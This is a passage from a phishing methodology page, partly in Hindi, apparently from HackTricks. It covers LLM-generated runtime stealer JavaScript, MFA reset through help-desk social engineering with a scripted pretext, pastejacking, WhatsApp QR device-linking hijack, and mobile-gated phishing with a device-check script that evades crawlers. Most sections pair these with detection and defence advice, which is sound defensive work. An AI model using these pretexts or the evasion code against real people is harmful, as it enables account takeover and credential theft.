- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta घटनाओं की निगरानी करें जहाँ **`deleteMFA` + `addMFA`** **same IP से कुछ मिनटों के भीतर** होते हैं।



## Clipboard Hijacking / Pastejacking

हमलावर समझौता किए गए या typo-squatted web page से पीड़ित के clipboard में चुपचाप malicious commands copy कर सकते हैं और फिर user को उन्हें **Win + R**, **Win + X** या terminal window में paste करने के लिए trick कर सकते हैं, जिससे बिना किसी download या attachment के arbitrary code execute हो जाता है।


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* एक lure page (जैसे fake ministry/CERT “channel”) WhatsApp Web/Desktop QR दिखाता है और victim को उसे scan करने के लिए instruct करता है, जिससे attacker silently **linked device** के रूप में add हो जाता है।
* Attacker तुरंत chat/contact visibility हासिल कर लेता है जब तक session remove न हो। Victims बाद में “new device linked” notification देख सकते हैं; defenders untrusted QR pages पर visits के तुरंत बाद unexpected device-link events की hunting कर सकते हैं।

### Mobile‑gated phishing to evade crawlers/sandboxes
Operators increasingly अपनी phishing flows को एक simple device check के पीछे gate करते हैं ताकि desktop crawlers final pages तक कभी न पहुँचें। एक common pattern एक छोटा script है जो touch-capable DOM test करता है और result को server endpoint पर पोस्ट करता है; non‑mobile clients को HTTP 500 (या blank page) मिलता है, जबकि mobile users को पूरा flow serve किया जाता है।

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logic (simplified):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server व्यवहार अक्सर देखा गया:
- पहली load के दौरान एक session cookie set करता है।
- `POST /detect {"is_mobile":true|false}` स्वीकार करता है।
- `is_mobile=false` होने पर subsequent GETs के लिए 500 (या placeholder) लौटाता है; phishing सिर्फ `true` होने पर serve करता है।

Hunting और detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: sequence of `GET /static/detect_device.js` → `POST /detect` → non‑mobile के लिए HTTP 500; legitimate mobile victim paths 200 के साथ follow‑on HTML/JS लौटाते हैं।
- जिन pages में content केवल `ontouchstart` या similar device checks पर condition किया गया हो, उन्हें block करें या scrutinize करें।

Defence tips:
- Crawlers को mobile-like fingerprints और JS enabled के साथ execute करें ताकि gated content reveal हो।
- Newly registered domains पर `POST /detect` के बाद suspicious 500 responses पर alert करें।

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
